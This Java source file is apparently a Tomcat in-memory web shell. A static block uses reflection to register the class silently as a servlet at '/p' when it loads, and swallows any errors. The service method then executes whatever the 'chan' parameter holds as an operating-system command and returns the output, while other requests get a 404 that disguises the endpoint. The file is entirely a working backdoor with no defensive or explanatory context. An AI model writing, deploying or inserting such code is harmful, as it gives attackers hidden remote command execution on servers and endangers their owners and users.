import jakarta.servlet.*;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import org.apache.catalina.Container;
import org.apache.catalina.Wrapper;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;

import java.io.IOException;
import java.lang.reflect.Method;

public class SRain10 implements Servlet {

    static{
        try{
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

            SRain10 greetServlet = new SRain10();

            Method createWrapper = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredMethod("createWrapper");
            Wrapper greetWrapper = (Wrapper) createWrapper.invoke(standardContext);

            Method gname = Container.class.getDeclaredMethod("setName", String.class);
            gname.invoke(greetWrapper,"p");

            Method gload = Wrapper.class.getDeclaredMethod("setLoadOnStartup", int.class);
            gload.invoke(greetWrapper,1);

            Method gservlet = Wrapper.class.getDeclaredMethod("setServlet", Servlet.class);
            gservlet.invoke(greetWrapper,greetServlet);

            Method gclass = Wrapper.class.getDeclaredMethod("setServletClass", String.class);
            gclass.invoke(greetWrapper,greetServlet.getClass().getName());

            Method gchild = StandardContext.class.getDeclaredMethod("addChild",Container.class);
            gchild.invoke(standardContext,greetWrapper);

            Method gmap = StandardContext.class.getDeclaredMethod("addServletMappingDecoded",String.class,String.class,boolean.class);
            gmap.invoke(standardContext,"/p", "p",false);
        }catch (Exception hi){
            //hi.printStackTrace();
        }
    }

    @Override
    public void init(ServletConfig config) throws ServletException {}

    @Override
    public String getServletInfo() {return null;}

    @Override
    public void destroy() {}    public ServletConfig getServletConfig() {return null;}

    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
        HttpServletRequest req = (HttpServletRequest) servletRequest;
        HttpServletResponse resp = (HttpServletResponse) servletResponse;
        if (req.getParameter("chan") != null){
            Process process = Runtime.getRuntime().exec(req.getParameter("chan"));
            java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(process.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                stringBuilder.append(line + '\n');
            }
            resp.getOutputStream().write(stringBuilder.toString().getBytes());
            resp.getOutputStream().flush();
            resp.getOutputStream().close();
            return;
        }
        else{
            resp.sendError(HttpServletResponse.SC_NOT_FOUND);
        }
    }
}

